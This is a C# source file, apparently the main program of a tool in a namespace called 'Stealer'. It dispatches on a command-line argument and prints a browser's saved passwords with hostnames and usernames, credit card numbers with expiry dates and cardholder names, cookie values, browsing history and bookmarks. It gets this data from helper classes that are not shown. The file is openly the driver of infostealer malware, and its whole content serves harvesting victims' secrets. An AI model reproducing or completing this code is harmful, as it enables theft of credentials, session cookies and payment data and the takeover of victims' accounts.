using System;

namespace Stealer
{
    class Program
    {
        static void Main(string[] args)
        {

            Console.WriteLine("Starting..");

            if (args.Length < 1) {
                Console.WriteLine("Please select commands [PASSWORDS/HISTORY/COOKIES/CREDIT_CARDS/BOOKMARKS]");
                Environment.Exit(1);
            }
            switch (args[0].ToUpper())
            {
                case "PASSWORDS":
                    {
                        /*
                            hostname - data[0]
                            username - data[1]
                            password - data[2]
                        */

                        foreach (string[] data in Passwords.get())
                        {
                            Console.WriteLine("\n[PASSWORD]\nHostname: " + data[0] + "\nUsername: " + data[1] + "\nPassword: " + data[2]);
                        }
                        break;
                    }

                case "CREDIT_CARDS":
                    {
                        /*
                            number   - data[0]
                            expYear  - data[1]
                            expMonth - data[2]
                            name     - data[3]
                        */

                        foreach (string[] data in CreditCards.get())
                        {
                            Console.WriteLine("\n[CREDIT_CARD]\nNumber: " + data[0] + "\nExpireYear: " + data[1] + "\nExpireMonth: " + data[2] + "\nName: " + data[3]);
                        }
                        break;
                    }

                case "COOKIES":
                    {
                        /*
                            value    - data[0]
                            hostKey  - data[1]
                            name     - data[2]
                            path     - data[3]
                            expires  - data[4]
                            isSecure - data[5]
                        */

                        foreach (string[] data in Cookies.get())
                        {
                            Console.WriteLine("\n[COOKIE]\nValue: " + data[0] + "\nHostKey: " + data[1] + "\nName: " + data[2] + "\nPath: " + data[3] + "\nExpires: " + data[4] + "\nisSecure: " + data[5]);
                        }
                        break;
                    }

                case "BOOKMARKS":
                    {
                        /*
                             url  - data[0]
                             name - data[1]
                             date - data[2]
                         */
                        foreach (string[] data in Bookmarks.get())
                        {
                            Console.WriteLine("\n[BOOKMARK]\nUrl: " + data[0] + "\nName: " + data[1] + "\nDate: " + data[2]);
                        }
                        break;
                    }

                case "HISTORY":
                    {
                        /*
                          url - data[0]
                          title - data[1]
                          visits - data[2]
                          date - data[3]
                        */
                        foreach (string[] data in History.get())
                        {
                            Console.WriteLine("\n[HISTORY]\nUrl: " + data[0] + "\nTitle: " + data[1] + "\nVisits: " + data[2] + "\nDate: " + data[3]);
                        }
                        break;
                    }

                default:
                    {
                        Console.WriteLine("Command not found!");
                        break;
                    }
            }
        }
    }   
}